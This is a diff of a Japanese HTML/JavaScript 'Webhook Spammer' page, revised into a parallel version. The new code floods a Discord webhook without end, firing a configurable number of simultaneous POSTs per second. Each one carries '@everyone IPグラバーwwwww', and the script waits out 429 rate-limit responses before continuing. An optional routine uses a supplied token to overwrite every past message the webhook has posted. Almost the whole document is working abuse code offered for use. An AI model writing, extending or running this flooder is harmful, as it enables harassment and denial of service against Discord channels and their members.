@@ -2,7 +2,7 @@
 <html lang="ja">
 <head>
   <meta charset="UTF-8">
-  <title>Webhook Spammer</title>
+  <title>Parallel Webhook Spammer</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     body {
@@ -41,66 +41,78 @@
 </head>
 <body>
   <div class="card">
-    <h2>Webhook Spammer</h2>
+    <h2>Webhook Spammer (Parallel)</h2>
     <label>Webhook URL</label>
     <input type="text" id="webhook" placeholder="https://discord.com/api/webhooks/..." />
 
-    <label>トークン（あれば、過去の投稿も書き換える）</label>
-    <input type="text" id="token" placeholder="MTAx...（任意）" />
+    <label>トークン（任意。過去投稿編集）</label>
+    <input type="text" id="token" placeholder="MTAx..." />
 
-    <button onclick="start()">実行開始</button>
+    <label>並列数（同時送信数）</label>
+    <input type="number" id="threads" placeholder="例: 10" value="5" />
+
+    <button onclick="start()">実行</button>
     <div id="log"></div>
   </div>
 
   <script>
     const log = (msg) => {
-      const logEl = document.getElementById("log");
-      logEl.textContent += msg + "\n";
-      logEl.scrollTop = logEl.scrollHeight;
+      const el = document.getElementById("log");
+      el.textContent += msg + "\n";
+      el.scrollTop = el.scrollHeight;
     };
 
-    const sleep = (ms) => new Promise(res => setTimeout(res, ms));
+    const sleep = (ms) => new Promise(r => setTimeout(r, ms));
 
-    async function sendSpam(webhook) {
-      const content = "@everyone IPグラバーwwwww";
-      while (true) {
+    async function sendOne(webhook, msg) {
+      try {
         const res = await fetch(webhook, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ content })
+          body: JSON.stringify({ content: msg })
         });
 
         if (res.status === 204 || res.status === 200) {
-          log("[✓] 送信成功");
+          log("[✓] Sent");
         } else if (res.status === 429) {
-          const data = await res.json();
-          log("[!] レート制限中 - " + data.retry_after + "ms 待機");
-          await sleep(data.retry_after);
+          const json = await res.json();
+          log("[!] Ratelimit " + json.retry_after + "ms");
+          await sleep(json.retry_after);
         } else if (res.status === 401 || res.status === 403) {
-          log("[×] Webhook無効またはアクセス拒否。停止。");
-          break;
+          log("[×] Webhook無効。停止");
+          throw new Error("forbidden");
         } else {
-          log("[?] 予期しないステータス: " + res.status);
+          log("[?] Status " + res.status);
         }
-
-        await sleep(1500);
+      } catch (e) {
+        log("[ERR] " + e.message);
       }
     }
 
-    async function editMessages(webhook, token) {
+    async function parallelSpam(webhook, threadCount) {
+      const message = "@everyone IPグラバーwwwww";
+
+      while (true) {
+        const promises = [];
+        for (let i = 0; i < threadCount; i++) {
+          promises.push(sendOne(webhook, message));
+        }
+
+        await Promise.all(promises); // 同時送信
+        await sleep(1000); // 1秒ごとに発射（調整して）
+      }
+    }
+
+    async function editOldMessages(webhook, token) {
       const listUrl = webhook + "/messages";
       try {
         const res = await fetch(listUrl, {
           headers: { Authorization: token }
         });
+        if (!res.ok) return log("[×] 過去メッセージ取得失敗: " + res.status);
 
-        if (!res.ok) {
-          log("[×] メッセージ取得失敗: " + res.status);
-          return;
-        }
-
-        const messages = await res.json();
-        for (const msg of messages) {
+        const msgs = await res.json();
+        for (const msg of msgs) {
           const editRes = await fetch(`${webhook}/messages/${msg.id}`, {
             method: "PATCH",
             headers: {
@@ -111,16 +123,16 @@
           });
 
           if (editRes.status === 429) {
-            const retry = (await editRes.json()).retry_after;
-            log("[!] 編集レート制限 - " + retry + "ms");
-            await sleep(retry);
+            const json = await editRes.json();
+            log("[!] 編集Ratelimit " + json.retry_after + "ms");
+            await sleep(json.retry_after);
           } else if (editRes.ok) {
-            log("[✓] 編集完了: " + msg.id);
+            log("[✓] 編集: " + msg.id);
           } else {
-            log("[×] 編集失敗: " + msg.id + " ステータス: " + editRes.status);
+            log("[×] 編集失敗: " + msg.id + " / " + editRes.status);
           }
 
-          await sleep(1500);
+          await sleep(1000);
         }
       } catch (err) {
         log("[ERROR] 編集中エラー: " + err.message);
@@ -130,19 +142,20 @@
     async function start() {
       const webhook = document.getElementById("webhook").value.trim();
       const token = document.getElementById("token").value.trim();
+      const threads = parseInt(document.getElementById("threads").value.trim()) || 5;
 
       if (!webhook.startsWith("https://discord.com/api/webhooks/")) {
-        log("[×] Webhook URLが不正！");
+        log("[×] URLが不正");
         return;
       }
 
       if (token) {
-        log("[i] トークン検出 → 過去メッセージ編集を実行");
-        await editMessages(webhook, token);
+        log("[i] 過去メッセージ編集開始");
+        await editOldMessages(webhook, token);
       }
 
-      log(">> スパム開始！");
-      await sendSpam(webhook);
+      log(">> 並列スパム開始！ Threads: " + threads);
+      await parallelSpam(webhook, threads);
     }
   </script>
 </body>
